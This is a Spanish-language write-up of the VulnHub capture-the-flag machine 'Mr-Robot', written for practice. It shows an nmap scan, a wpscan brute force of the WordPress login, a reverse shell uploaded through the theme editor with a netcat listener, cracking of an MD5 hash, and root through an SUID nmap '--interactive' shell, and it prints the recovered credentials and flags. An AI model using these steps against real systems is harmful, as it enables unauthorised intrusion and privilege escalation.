---
title: "Mr-Robot - VulnHub"
description: "Writeup de Mr-Robot, una máquina temática basada en la serie de TV, con múltiples vectores de ataque."
pubDate: 2024-10-22
platform: "vulnhub"
category: "machines"
difficulty: "medium"
os: "linux"
language: es
tags: ["wordpress", "bruteforce", "suid", "privilege-escalation"]
retired: false
heroImage: "/images/writeups/vulnhub/mrrobot-card.png"
attackVectors: ["web", "privilege-escalation"]
techniques: ["T1110", "T1078", "T1548"]
certifications: ["OSCP", "eCPPT"]
skillLevel: "intermediate"
estimatedTime: "2-3 horas"
rating: 5
---

# Mr-Robot - VulnHub Writeup

**Dificultad**: Medium  
**OS**: Linux  
**Plataforma**: VulnHub

## Reconocimiento

```bash
nmap -sC -sV -p- 192.168.1.101
```

**Puertos abiertos:**
- 80/tcp (HTTP - Apache)
- 443/tcp (HTTPS - Apache)

## Enumeración Web

Encontramos un sitio web temático de Mr. Robot con WordPress.

### Archivos interesantes:

- `/robots.txt` - Contiene `key-1-of-3.txt` y `fsocity.dic`
- `/wp-login.php` - Panel de login de WordPress

**Primera llave**: `073403c8a58a1f80d943455fb30724b9`

## Fuerza bruta

Usamos `fsocity.dic` para hacer fuerza bruta al login de WordPress:

```bash
wpscan --url http://192.168.1.101 -U elliot -P fsocity.dic
```

**Credenciales**: `elliot:ER28-0652`

## Shell inicial

Subimos una reverse shell PHP a través del editor de temas de WordPress.

```bash
nc -lvnp 4444
```

## Escalada de privilegios

Encontramos credenciales en `/home/robot`:
- `password.raw-md5`: `c3fcd3d76192e4007dfb496cca67e13b`

Crackeamos el hash: `abcdefghijklmnopqrstuvwxyz`

Buscamos binarios SUID:

```bash
find / -perm -4000 2>/dev/null
```

Encontramos `nmap` con SUID:

```bash
nmap --interactive
!sh
```

¡Shell como root!

## Banderas

- **Key 1**: `073403c8a58a1f80d943455fb30724b9`
- **Key 2**: `822c73956184f694993bede3eb39f959`
- **Key 3**: `04787ddef27c3dee1ee161b21670b4e4`

## Conclusión

Máquina muy divertida y temática, ideal para practicar WordPress y escalada básica.
